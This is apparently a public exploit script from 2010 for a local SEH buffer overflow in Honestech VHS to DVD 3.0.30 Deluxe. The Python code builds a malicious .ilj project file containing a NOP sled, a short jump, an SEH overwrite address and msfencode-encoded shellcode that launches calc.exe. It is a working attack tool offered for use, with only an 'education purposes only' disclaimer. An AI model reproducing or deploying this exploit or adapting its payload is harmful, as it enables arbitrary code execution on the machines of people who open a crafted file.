#!/usr/bin/python
#
# Exploit Title: Honestech VHS to DVD <= 3.0.30 Deluxe Local Buffer Overflow (SEH)
# Date: September 16, 2010
# Author: Brennon Thomas thomab310@gmail.com
# Software Link: n/a
# Version: <= 3.0.30.0 Deluxe
# Tested on: Windows XP SP2/SP3 using Honestech VHS to DVD 3.0.2 and 3.0.30.0
#
# Usage: This python script generates the malicious .ilj project file. 
# Open Honestech VHS to DVD <= 3.0.30 Deluxe in Advanced mode and
# load the corrupt file.
#
# Exploit is for education purposes only.  Author takes no responsibility
# for what you do with it. 

#Required file text
buf = "\r\n\
\r\n\
<CAPTURE>\r\n\
\r\n\
[MAINDLG]\r\n\
PAGE=0\r\n\
\r\n\
[AVICODEC]\r\n\
VIDEOCODEC=DivX 6.8.5 Codec (2 Logical CPUs)\r\n\
AUDIOCODEC=MPEG Layer-3\r\n\
\r\n\
[WMVINFO]\r\n\
TITLE=  \r\n\
AUTHOR=  \r\n\
COPYRIGHT=  \r\n\
DESCRIPTION=  \r\n\
\r\n\
[CAPTUREINFO]\r\n\
OUTPUTFOLDER=E:\\misc\\\r\n\
STATE=0,1,1,0,4396,4,1,0,0\r\n\
\r\n\
[BURNINFO]\r\n\
STATE=0,0,0,0,0,0\r\n\
TEMPFOLDER=E:\\misc\\\r\n\
VIDEOTSFOLDER=E:\\misc\\\r\n\
IMAGEFOLDER=E:\\misc\\\r\n\
\r\n\
[FILELIST]\r\n\
FILE=E:\\"

buf += "\x90"*257         #Junk
buf += "\xeb\x08\x90\x90" #JMP SHORT 8, NOP Padding
buf += "\xba\x25\x31\x58" #SEH Overwrite to POP,POP,RETN in msg723.acm
buf += "\x90"*16          #NOP Buffer

#msfpayload windows/exec CMD=calc.exe R | msfencode -a x86 -b '\x00\x0a\x0d\x2c' -t c
#[*] x86/shikata_ga_nai succeeded with size 228 (iteration=1)
buf += ("\xbe\xf9\x89\xfa\xaa\xdb\xca\xd9\x74\x24\xf4\x33\xc9\xb1\x33"
"\x5d\x31\x75\x13\x83\xed\xfc\x03\x75\xf6\x6b\x0f\x56\xe0\xe5"
"\xf0\xa7\xf0\x95\x79\x42\xc1\x87\x1e\x06\x73\x18\x54\x4a\x7f"
"\xd3\x38\x7f\xf4\x91\x94\x70\xbd\x1c\xc3\xbf\x3e\x91\xcb\x6c"
"\xfc\xb3\xb7\x6e\xd0\x13\x89\xa0\x25\x55\xce\xdd\xc5\x07\x87"
"\xaa\x77\xb8\xac\xef\x4b\xb9\x62\x64\xf3\xc1\x07\xbb\x87\x7b"
"\x09\xec\x37\xf7\x41\x14\x3c\x5f\x72\x25\x91\x83\x4e\x6c\x9e"
"\x70\x24\x6f\x76\x49\xc5\x41\xb6\x06\xf8\x6d\x3b\x56\x3c\x49"
"\xa3\x2d\x36\xa9\x5e\x36\x8d\xd3\x84\xb3\x10\x73\x4f\x63\xf1"
"\x85\x9c\xf2\x72\x89\x69\x70\xdc\x8e\x6c\x55\x56\xaa\xe5\x58"
"\xb9\x3a\xbd\x7e\x1d\x66\x66\x1e\x04\xc2\xc9\x1f\x56\xaa\xb6"
"\x85\x1c\x59\xa3\xbc\x7e\x34\x32\x4c\x05\x71\x34\x4e\x06\xd2"
"\x5c\x7f\x8d\xbd\x1b\x80\x44\xfa\xd3\xca\xc5\xab\x7b\x93\x9f"
"\xe9\xe6\x24\x4a\x2d\x1e\xa7\x7f\xce\xe5\xb7\xf5\xcb\xa2\x7f"
"\xe5\xa1\xbb\x15\x09\x15\xbc\x3f\x6a\xf8\x2e\xa3\x43\x9f\xd6"
"\x46\x9c\x55")

buf += "\x90"*(6000-(len(buf))) #NOP Buffer
buf += ",0,7462,885953024,4,1,640,480\r\n" #Required file text

f = open("sploit.ilj", "w")
f.write(buf)
f.close()